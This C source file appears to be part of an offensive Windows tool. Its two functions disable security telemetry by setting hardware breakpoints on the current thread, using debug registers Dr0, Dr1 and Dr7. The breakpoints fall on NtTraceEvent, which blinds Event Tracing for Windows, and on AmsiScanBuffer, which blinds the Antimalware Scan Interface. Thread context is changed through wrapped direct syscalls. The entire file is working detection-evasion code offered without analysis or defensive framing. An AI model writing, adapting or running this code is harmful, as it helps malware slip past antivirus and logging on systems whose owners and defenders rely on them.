#include <windows.h>
#include <unwin.h>

#include "../debug/debug.h"
#include "../syscalls/syscalls.h"

static NTSTATUS status;

int ETWPatching() {
    if (!GetFunctionAddr(&GlobalVSE, "NtTraceEvent")) {
        return -1;
    }

    PVOID NtTraceEventAddr = GlobalVSE.SyscallAddr;

    CONTEXT context;
    context.ContextFlags = CONTEXT_DEBUG_REGISTERS;

    EXECUTE_VSE(
        GlobalVSE,
        "NtGetContextThread",
        status,
        (HANDLE) NtCurrentThread,
        (PCONTEXT) &context
    );

    if ( !NT_SUCCESS(status) ) {
        DEBUG_ERROR("ERROR on NtGetContextThread 0x%x", status);
        return -1;
    }

    context.Dr7 |= (1 << 0);
    context.Dr7 &= ~((3 << 16) | (3 << 18));
    context.Dr7 |= (0 << 16) | (0 << 18);
    context.Dr0 = (DWORD64) NtTraceEventAddr;

    EXECUTE_VSE(
        GlobalVSE,
        "NtSetContextThread",
        status,
        (HANDLE) NtCurrentThread,
        (PCONTEXT) &context
    );

    if ( !NT_SUCCESS(status) ) {
        DEBUG_ERROR("ERROR on NtSetContextThread 0x%x", status);
        return -1;
    }

    DEBUG_INFO("ETW patched at %p", NtTraceEventAddr);
    return 0;
}

int AMSIPatching() {
    HMODULE amsi = GetModuleHandleA("amsi");
    if (amsi == NULL) {
        amsi = LoadLibraryA("amsi");
    }

    LPVOID amsiScanBufferAddr = (LPVOID)GetProcAddress(amsi, "AmsiScanBuffer");

    CONTEXT context;
    context.ContextFlags = CONTEXT_DEBUG_REGISTERS;

    EXECUTE_VSE(
        GlobalVSE,
        "NtGetContextThread",
        status,
        (HANDLE) NtCurrentThread,
        (PCONTEXT) &context
    );

    if ( !NT_SUCCESS(status) ) {
        DEBUG_ERROR("ERROR on NtGetContextThread 0x%x", status);
        return -1;
    }
    context.Dr7 |= (1 << 2);
    context.Dr7 &= ~((3 << 20) | (3 << 22));
    context.Dr7 |= (0 << 20) | (0 << 22);
    context.Dr1 = (DWORD64) amsiScanBufferAddr;

    EXECUTE_VSE(
        GlobalVSE,
        "NtSetContextThread",
        status,
        (HANDLE) NtCurrentThread,
        (PCONTEXT) &context
    );

    if ( !NT_SUCCESS(status) ) {
        DEBUG_ERROR("ERROR on NtSetContextThread 0x%x", status);
        return -1;
    }

    DEBUG_INFO("AMSI patched in %p", amsiScanBufferAddr);

    return 0;
}
